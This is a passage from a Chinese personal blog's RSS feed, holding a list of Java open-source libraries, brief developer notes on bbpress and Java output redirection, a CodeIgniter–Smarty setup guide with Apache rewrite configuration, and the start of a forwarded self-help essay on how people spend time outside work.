<TD>DBCP - Connection pooling implementations</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/dbutils/"  >DBUtils</A> </TD>  <TD>DbUtils - Set of classes designed to make working with JDBC easier</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/digester/"  >Digester</A> </TD>  <TD>Struts Digester - Configure an XML/Java mapping with actions when patterns are recognized</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/discovery/"  >Discovery</A> </TD>  <TD>Discovery - Discovering, or finding, implementations for pluggable interfaces</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.xbill.org/dnsjava"  >DNSJava</A> </TD>  <TD>DNS in Java - Supporting common record types, queries, zone transfers and dynamic updates</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://java.sun.com/j2se/1.5.0/docs/guide/javadoc"  >doclet</A> </TD>  <TD>JavaDoc Doclet - Custom output from the types methods and fields in a source tree.</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.dom4j.org/"  >Dom4j</A> </TD>  <TD>DOM4J - XML, XPath and XSLT library</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://wutka.com/dtdparser.html"  >DTDParser</A> </TD>  <TD>DTDParse DTD Library - You can use this library to parse a DTD</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/el/"  >EL</A> </TD>  <TD>EL - The JSP 2.0 Expression Language Interpreter from Apache</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://fastutil.dsi.unimi.it/"  >fastutil</A> </TD>  <TD>FastUtil - Type-specific maps sets and lists with a small memory footprint and fast access</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/fileupload/"  >FileUpload</A> </TD>  <TD>HTTP File Upload Library - Add robust, fast file upload capability to your web applications</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://freemarker.sourceforge.net/"  >FreeMarker</A> </TD>  <TD>HTML Template Engine<A rel="nofollow" href="http://andyluo.blogjava.net/"  >http://andyluo.blogjava.net</A></TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.gjt.org/"  >GJT</A> </TD>  <TD>Giant Java Tree - Java library consisting entirely of open source components</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.cacas.org/java/gnu/regexp"  >gnu-regex</A> </TD>  <TD>GNU Regular Expressions - Implementation of a traditional (non-POSIX) NFA regex engine</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://groovy.codehaus.org/"  >Groovy</A> </TD>  <TD>Groovy - Scripting Language</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://glassfish.dev.java.net/"  >GlassFish</A> </TD>  <TD>an oo app server implements JavaEE 5</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.hibernate.org/"  >Hibernate</A> </TD>  <TD>Hibernate - Relational Persistence For Idiomatic Java</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/hivemind/"  >HiveMind</A> </TD>  <TD>HiveMind - A services and configuration microkernel</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://hsqldb.sourceforge.net/"  >HSQLDB</A> </TD>  <TD>HSQLDB - The Java SQL relational database</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://htmlparser.sourceforge.net/"  >HTMLParser</A> </TD>  <TD>HTML Parser - Java library used to parse HTML</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/httpclient/"  >HTTPClient</A> </TD>  <TD>HTTP Client - Fills holes left by the java.net package, including most recent HTTP standards</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://informa.sourceforge.net/"  >Informa</A> </TD>  <TD>Informa - News aggregation library --- LGPL协议</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/io/"  >IO</A> </TD>  <TD>Commons-IO - Utility classes, stream implementations, file filters and endian classes for IO</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.lowagie.com/iText/"  >iText</A> </TD>  <TD>iText - Generates PDF on the fly</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://java.sun.com/j2ee/1.4/docs"  >J2EE</A> </TD>  <TD>Java 2 Platform, Enterprise Edition</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://java.sun.com/j2se/1.5.0/docs"  >J2SE</A> </TD>  <TD>Java2 Standard Edition v5<A rel="nofollow" href="http://www.blogjava.net/Andyluo/archive/2006/04/15/javaprojects.html"  >http://www.blogjava.net/Andyluo/archive/2006/04/15/javaprojects.html</A></TD></TR>  <TR>  <TD><A rel="nofollow" href="http://java.sun.com/products/java-media/jai"  >JAI</A> </TD>  <TD>Java Advanced Imaging - Network-enabled, scalable, platform-independent image processing</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jalopy.sourceforge.net/"  >Jalopy</A> </TD>  <TD>Jalopy Source Formatter - Formats Java source code according to widely configurable rules</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/tomcat/"  >Jasper</A> </TD>  <TD>Jasper - Tomcat JSP engine<A rel="nofollow" href="http://andyluo.blogjava.net/"  >http://andyluo.blogjava.net</A></TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jasperreports.sourceforge.net/"  >JasperReports</A> </TD>  <TD>JasperReports - Free Java reporting library</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://java.sun.com/products/java-media/3D"  >Java3d</A> </TD>  <TD>Java3D - Object-oriented interfaces that support a simple, high-level programming mode</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://java.sun.com/products/javacomm/"  >JavaComm</A> </TD>  <TD>Java Communications - API for technologies such as voice mail, fax and smartcards</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.javagroups.com/"  >JavaGroups</A> </TD>  <TD>JavaGroups - Reliable multicast communication enable processes to send messages to each other</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jaxen.codehaus.org/"  >Jaxen</A> </TD>  <TD>Jaxen XPath Processor - Object model walker; evaluate XPath expressions in dom4j and JDOM</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://ws.apache.org/jaxme/"  >JAXME</A> </TD>  <TD>JaxMe 2 - Open source implementation of JAXB</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.ej-technologies.com/products/jclasslib/overview.html"  >JClassLib</A> </TD>  <TD>JClassLib - Library for reading, modifing and writing Java class files and bytecode</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.jfree.org/jcommon"  >JCommon</A> </TD>  <TD>JCommon - Collection of useful classes used by JFreeChart, JFreeReport and other projects</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jcrontab.sourceforge.net/"  >JCrontab</A> </TD>  <TD>JCronTab - Scheduler written in Java, provide a fully functional schedules for Java projects</TD></TR>  <TR>  <TD><A rel="nofollow" href="https://jdic.dev.java.net/"  >JDIC</A> </TD>  <TD>JDIC - JDesktop Integration Components</TD></TR>  <TR>  <TD><A rel="nofollow" href="https://jdnc.dev.java.net/"  >JDNC</A> </TD>  <TD>JDNC - JDesktop Network Components</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://java.sun.com/products/jdo"  >JDO</A> </TD>  <TD>Java Data Objects - Direct storage of Java domain model instances into a database</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.jdom.org/"  >JDOM</A> </TD>  <TD>JDOM XML Library - For accessing, manipulating and outputting XML data from Java code.</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://portals.apache.org/jetspeed-1/"  >JetSpeed</A> </TD>  <TD>JetSpeed - Java Portal Server<A rel="nofollow" href="http://www.blogjava.net/Andyluo/archive/2006/04/15/javaprojects.html"  >http://www.blogjava.net/Andyluo/archive/2006/04/15/javaprojects.html</A></TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/jexl/"  >JEXL</A> </TD>  <TD>Java Expression Language - is an embedable expression language engine</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.jfree.org/jfreechart"  >JFreeChart</A> </TD>  <TD>JFreeChart - Free library for generating charts, including pie, bar, line and areas charts</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.jgroups.org/"  >JGroups</A> </TD>  <TD>JGroups - Multicast communication toolkit</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/jmeter/"  >JMeter</A> </TD>  <TD>JMeter - Load testing applcation</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://java.sun.com/products/java-media/jmf/"  >JMF</A> </TD>  <TD>Java Media Framework - Library for audio, video and other time-based media</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jmock.codehaus.org/"  >JMock</A> </TD>  <TD>JMock - Testing library<A rel="nofollow" href="http://www.blogjava.net/Andyluo/archive/2006/04/15/javaprojects.html"  >http://www.blogjava.net/Andyluo/archive/2006/04/15/javaprojects.html</A></TD></TR>  <TR>  <TD><A rel="nofollow" href="http://java.sun.com/j2ee/javaserverfaces"  >JSF</A> </TD>  <TD>JavaServer Faces - Web Framework</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.crosswire.org/jsword"  >JSword</A> </TD>  <TD>JSword - Bible software in Java, compatible with the Sword project for C/C++</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jtidy.sourceforge.net/"  >JTidy</A> </TD>  <TD>JTidy - HTML syntax checker</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.junit.org/"  >JUnit</A> </TD>  <TD>JUnit - Regression testing framework used by the developer who implements unit tests in Java</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/jxpath/"  >JXPath</A> </TD>  <TD>JXPath Library - Simple interpreter of an expression language called XPath</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/lang/"  >Lang</A> </TD>  <TD>Lang - Utilities including Enums, String manipulation, reflection, serialization and more</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://logging.apache.org/log4j/"  >Log4J</A> </TD>  <TD>Log4J - Fast logging API that lets you configure logging at runtime</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/logging/"  >Logging</A> </TD>  <TD>Commons Logging - Simple wrapper API around multiple logging APIs</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/lucene/"  >Lucene</A> </TD>  <TD>Lucene - high-performance, full-featured text search engine written entirely in Java</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/math/"  >Math</A> </TD>  <TD>Math - Library of lightweight, self-contained mathematics and statistics components</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/net/"  >Net</A> </TD>  <TD>Network Library - Support for Finger, Whois, TFTP, Telnet, FTP, NNTP, etc developed by ORO</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://db.apache.org/ojb/"  >OJB</A> </TD>  <TD>OJB - O/R tool that allows transparent persistence</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://openjms.sourceforge.net/"  >OpenJMS</A> </TD>  <TD>Open source JMS server</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/oro/"  >ORO</A> </TD>  <TD>ORO - Text processing library</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.opensymphony.com/oscache/"  >OSCache</A> </TD>  <TD>OSCache - A high performance J2EE caching framework</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.eteks.com/pja/en/"  >PJA</A> </TD>  <TD>Pure Java AWT - Toolkit for drawing graphics without any native graphics resources</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://pmd.sourceforge.net/"  >PMD</A> </TD>  <TD>PMD - Scans Java source code for potential problems</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/poi/"  >POI</A> </TD>  <TD>POI - Java OLE 2 Manipulator</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/pool/"  >Pool</A> </TD>  <TD>Commons Pooling - provides an generic, configurable Object-pooling API</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/primitives/"  >Primitives</A> </TD>  <TD>Primitives - Collection of types and utilities optimized for working with Java primitives</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://proxool.sourceforge.net/"  >Proxool</A> </TD>  <TD>Java connection pool</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.opensymphony.com/quartz"  >Quartz</A> </TD>  <TD>Quartz - J2EE open source job scheduler</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/regexp"  >Regexp</A> </TD>  <TD>Jakarta Regular Expressions - Java RegEx library under BSD style license</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.mozilla.org/rhino"  >Rhino</A> </TD>  <TD>Mozilla JavaScript - open-source implementation of JavaScript written entirely in Java</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://opensource.atlassian.com/seraph/"  >Seraph</A> </TD>  <TD>Seraph - Atlassian Security Framework</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.opensymphony.com/sitemesh"  >SiteMesh</A> </TD>  <TD>A web-page layout and decoration framework</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/slide/"  >Slide</A> </TD>  <TD>Slide - Content repository, can serve as a basis for CMS</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://ws.apache.org/soap/"  >SOAP</A> </TD>  <TD>Apache Soap - implementation of the SOAP submission to W3C</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://speedo.objectweb.org/"  >Speedo</A> </TD>  <TD>OSS JDO implementation转载自<A rel="nofollow" href="http://andyluo.blogjava.net/"  >http://andyluo.blogjava.net</A></TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.springframework.org/"  >Spring</A> </TD>  <TD>Server Side alternative to J2EE APIs</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://struts.apache.org/"  >Struts</A> </TD>  <TD>Jakarta Struts - open source framework for building web applications</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/tapestry/"  >Tapestry</A> </TD>  <TD>Tapestry - Web Framework</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/turbine/"  >Turbine</A> </TD>  <TD>Turbine - Servlet based framework allowing developers to quickly build secure web applications</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://uddi4j.sourceforge.net/"  >UDDI4J</A> </TD>  <TD>UDDI4J - Library that provides an API to interact with a UDDI registry</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/validator/"  >Validator</A> </TD>  <TD>Validtator - Validate data from user input</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/velocity/"  >Velocity</A> </TD>  <TD>Velocity - Support for clean, quick MVC web development and support for the Struts framework</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://share.whichever.com/village"  >Village</A> </TD>  <TD>Village - API that sits on top of the JDBC to make it easier to interact with a JDBC</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.opensymphony.com/webwork/"  >WebWork 2</A> </TD>  <TD>Next generation of WebWork</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://xml.apache.org/xalan-j/"  >Xalan</A> </TD>  <TD>Xalan - XSLT processor for transforming XML documents into HTML, text, or XML</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://xdoclet.sourceforge.net/"  >XDoclet</A> </TD>  <TD>XDoclet - Code generation engine</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://xml.apache.org/xerces2-j"  >Xerces</A> </TD>  <TD>Xerces2 - The next generation of high performance, XML parsers in the Apache Xerces family</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://xmlbeans.apache.org/"  >XMLBeans</A> </TD>  <TD>XMLBeans - XML-Java binding tool转载自<A rel="nofollow" href="http://andyluo.blogjava.net/"  >http://andyluo.blogjava.net</A></TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.xmlpull.org/"  >XMLPull</A> </TD>  <TD>XMLPull - Defines a simple pull parsing API that does pull XML parsing from J2ME to J2EE</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://ws.apache.org/xmlrpc/"  >XMLRPC</A> </TD>  <TD>XML-RPC - Implementation of XML-RPC, using XML over HTTP to implement remote procedure calls</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://xml.apache.org/xerces2-j"  >XNI</A> </TD>  <TD>Xerces Native Interface - Framework for streaming a document and constructing generic parsers</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://www.cafeconleche.org/XOM/"  >XOM</A> </TD>  <TD>XML Object Model - Tree-based API for processing XML that strives for correctness and simplicity.</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://xstream.codehaus.org/"  >XStream</A> </TD>  <TD>XML serialization</TD></TR></TABLE></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200792292048434/</guid>
    </item>
    <item>
      <title>
<![CDATA[守-破-离之道学bbpress]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200991411857147/</link>
      <description>
<![CDATA[第一阶段遭遇灾难性困难：无道可守<br>bbpress是wordpress的一个姐妹项目，能和wordpress结合的轻量级论坛。致命伤：没有文档<br>按照守-破-离之道，第一步的守应该按照get started进行，可惜这个项目即没有get started，也没有文档。<br>之恩能够守破合一，采用WordPress的文档，边改边学，颇为痛苦<br><br>第一个例子add_act<wbr>ion("wp_head") 需要改为add_act<wbr>ion(“bb_head"<br>第二个例子add_filter("the_content") bbpress里没有the_content，在文档里也没看到替代品，跳过<br>第三个例子add_filter("get_comment_author") 改为 get_post_author<br>第四个例子add_act<wbr>ion("activate_...") 失败<br><br>痛苦中前行，晨光何时何处<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200991411857147/</guid>
    </item>
    <item>
      <title>
<![CDATA[Java的IO重定向]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720071019114649920/</link>
      <description>
<![CDATA[<P>Linux中的文件描述符，可以把1关掉，然后打开另外一个，则另外一个为1，同理，Java也支持这种功能。不知道从哪个版本开始支持的</P>
<P>System.setOut()</P>
<P>System.setErr()</P>
<P>这样可以方便的把命令行的输出重定向到GUI的程序中</P>
<P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720071019114649920/</guid>
    </item>
    <item>
      <title>
<![CDATA[CodeIgniter+Smarty]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720103119182413/</link>
      <description>
<![CDATA[<style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style>Co<wbr>de Igniter是一个很不错的PHP框架，Smarty是一个非常好的显示层框架，下面将这两个框架集成安装到一起：<div>1. google下载最新的CodeIgniter和Smarty</div>
<div>2. 将CodeIgniter解压缩到web程序根目录下，如myweb</div>
<div>3. 配置CodeIgniter</div>
<div>打开myweb/system/application/config/config.php，修改baseurl</div>
<div>打开myweb/system/application/config/database.php, 修改数据库信息</div>
<div>*如果将myweb/system文件夹改名为myweb/whoknows, 则要打开index.php,修改system_folder</div>

<div>4. 配置Co<wbr>de Igniter和smarty</div>
<div>将smarty文件夹放到system同级目录下</div>
<div>打开myapp/system/application/config/autoload.php, 加入:<br>$autoload['libraries'] = array('database', 'mysmarty');<br>这句话指定Co<wbr>de Igniter去myapp/system/application/library下加载mysmarty.php<br></div>
<div>增加文件myapp/system/application/library/mysmarty.php(内容见最后)</div>
<div>5. CodeIgniter的url格式为http://www.abc.com/myapp/index.php/class/method, 要将index.php从url中去除, 则需要</div>
<div>1)在myapp目录下添加.htaccess文件</div>
<div><font face="monospace">RewriteEngine On<br>RewriteCond $1 !^(index\.php|css|img|js|robots\.txt)<br>RewriteRule ^(.*)$ /Ilghar/index.php/$1 [L]</font></div>
<div>2)启动apache的rewrite功能：<br>创建 ln -s <font face="monospace">/etc/apache2/mods-available/rewrite.load /etc/apache2/mods-enabled<span style="font-family: Tahoma;">/</span></font></div>
<div>修改<font face="monospace">$ sudo vi </font><font face="monospace">/etc/apache2/</font><font face="monospace">sites-available/default</font></div>
<div><font face="monospace">AllowOverride <span style="font-weight: bold;">All</span></font></div>
<div><br>mysmarty.php文件如下：</div>
<div><font face="monospace">&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');<br><br>require "smarty/libs/Smarty.class.php";<br><br>/**<br>* @file system/application/libraries/mysmarty.php<br>*/<br>class Mysmarty extends Smarty<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;function Mysmarty()<br>&nbsp;&nbsp;&nbsp;&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;Smarty();<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config =&amp; get_config();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// absolute path prevents "template not found" errors<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;template_dir = (!empty($config['smarty_template_dir']) ? $config['smarty_template_dir'] : BASEPATH . 'application/views/');<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;compile_dir &nbsp;= (!empty($config['smarty_compile_dir']) ? $config['smarty_compile_dir'] : BASEPATH . 'cache/');<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//use CI's cache folder &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;assign("baseUrl", $config['base_url']);<br>&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;/**<br>&nbsp;&nbsp;&nbsp;&nbsp;* @param $resource_name string<br>&nbsp;&nbsp;&nbsp;&nbsp;* @param $params array holds params that will be passed to the template<br>&nbsp;&nbsp;&nbsp;&nbsp;* @desc loads the template<br>&nbsp;&nbsp;&nbsp;&nbsp;*/<br>&nbsp;&nbsp;&nbsp;&nbsp;function view($resource_name, $params = array()) &nbsp;&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (strpos($resource_name, '.') === false) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$resource_name .= '.tpl';<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_array($params) &amp;&amp; count($params)) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($params as $key =&gt; $value) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;assign($key, $value);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// check if the template file exists.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!is_file($this-&gt;template_dir . $resource_name)) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show_error("template: [$resource_name] cannot be found.");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return parent::display($resource_name);<br>&nbsp;&nbsp;&nbsp;&nbsp;}<br>} // END class smarty_library<br>?&gt;</font></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720103119182413/</guid>
    </item>
    <item>
      <title>
<![CDATA[[Fw]人和人之间在八小时之外的差别]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720083249387801/</link>
      <description>
<![CDATA[<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp;业余八小时人的活动千姿百态。八小时以外你在干什么，恰恰决定着你这个人的基本素质，决定着你晚年怎么过。为什么八小时外你去干这个，他干那个，这就是每个人的人文取向，你追求什么，你有兴趣的是什么，你想得到一些什么，你从什么里面能得到乐趣，这是人文取向。“本文来自: http://hkmsn.kblcw.com”</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp;八小时之外，你在干什么？是在打牌、玩游戏、看电视，还是看书、锻炼、做些有益于身心和工作的事情？</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp;有资料显示：一个人的成功，差别不在于工作的八小时之内，而在于八小时之外。我们可以理解和相信你在八小时之外，你是能抓住机会的，给自己充电，丰富自己的学识，锻炼自己的能力，那么，你就比别人更有机会成功。</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp;中年的差别不在八小时工作之内，八小时工作之内大家做的都是差不多的。人和人之间在八小时之内的差别是你做得好一点，我做得差一点，你做得多我做得少，只是量的差别。</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp;而八小时以外，就不一样了。有的人继续在做研究，除了研究没有别的事；有的人在看书充实自己；有的人在浏览报纸、杂志，了解国内外的大事；有的在逛商场，买东西；有的在照顾孩子；有的在逛公园，照相；有的在追着电视剧；有的在打麻将，在玩扑克；有的在搞婚外恋；有的在跑买官；有的在玩 股票；有的在琢磨怎么跟邻居吵架。</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 人是这样拉开贫富距离的！</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 1.自我认知 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 穷人：很少想到如何去赚钱和如何才能赚到钱，认为自己一辈子就该这样，不相信会有什么改变。 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：骨子里就深信自己生下来不是要做穷人，而是要做富人，他有强烈的赚钱意识，这已是他血液里的东西，他会想尽一切办法使自己致富。</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 2.休闲 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 穷人：在家看电视，为肥皂剧的剧情感动得痛哭流涕，还要仿照电视里的时尚打扮自己。</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：在外跑市场，即使打高尔夫球也不忘带着项目合同。 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 3.交际圈子</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 穷人：喜欢走穷亲戚，穷人的圈子大多是穷人，也排斥与富人交往，久而久之，心态成了穷人的心态，思维成了穷人的思维，做出来的事也就是穷人的模式。大家每天谈论着打折商品，交流着节约技巧，虽然有利于训练生存能力，但你的眼界也就渐渐囿于这样的琐事，而将雄心壮志消磨掉了。&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：最喜欢交那种对自己有帮助，能提升自己各种能力的朋友。不纯粹放任自己仅以个人喜好交朋友。&nbsp;&nbsp; </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp; 4.学习</P>
